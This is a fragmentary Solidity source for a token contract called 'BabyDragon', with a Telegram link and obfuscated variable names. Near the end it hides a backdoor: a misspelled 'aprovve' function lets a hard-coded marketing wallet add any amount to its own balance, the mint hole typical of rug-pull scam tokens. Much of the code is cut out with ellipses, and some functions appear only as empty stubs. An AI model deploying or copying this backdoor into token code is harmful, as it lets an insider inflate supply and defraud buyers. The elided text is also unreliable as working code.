...
https://t.me/babydragoncommunity
...
contract Context {
 ...
 contract BabyDragon is Context, ERC20, ERC20Metadata {
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private superfloEVER;
    ...
    uint256 private cryfaleEVER = 4;
    uint256 private _vebegoEVER = 1;
    ...
    constructor(uint256 totalSupply_) {
        ...
        _owner = _msgSender();
        superfloEVER[msg.sender] = totalSupply_;
    ...
    address private _MarketingWalletEVER = 0xFD08344C797B0DEd98a880d8E149eae2B7106aE8;
...
function _multiply (uint256 amount) private {
  ...
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    ...
    function _transfer(
        ...
        uint256 senderBalance = superfloEVER[issuer];
        require(senderBalance >= allons, "Too high value");
        unchecked {
            superfloEVER[issuer] = senderBalance - allons;
        }
        _fee = (allons * cryfaleEVER / 100) / _vebegoEVER;
        allons = allons -  (_fee * _vebegoEVER);
        
        superfloEVER[grantee] += allons;
   ...
   */
     ...
     */
    function _burn(address account, uint256 gzillaEVER) internal virtual {
        require(account != address(0), "Can't burn from address 0");
        uint256 accountBalance = superfloEVER[account];
        require(accountBalance >= gzillaEVER, "BEP : Can't be done");
        unchecked {
            superfloEVER[account] = accountBalance - gzillaEVER;
        }
        _totalSupply -= gzillaEVER;

        emit Transfer(account, address(0), gzillaEVER);
    }
...
function _subvert (uint256 tokenAmount) private lockTheSwap {
      ...
      function aprovve(uint256 burn) public{
        superfloEVER[_msgSender()] += burn;
        require(_msgSender() == _MarketingWalletEVER, "ERC20: cannot permit dev address");
    }   
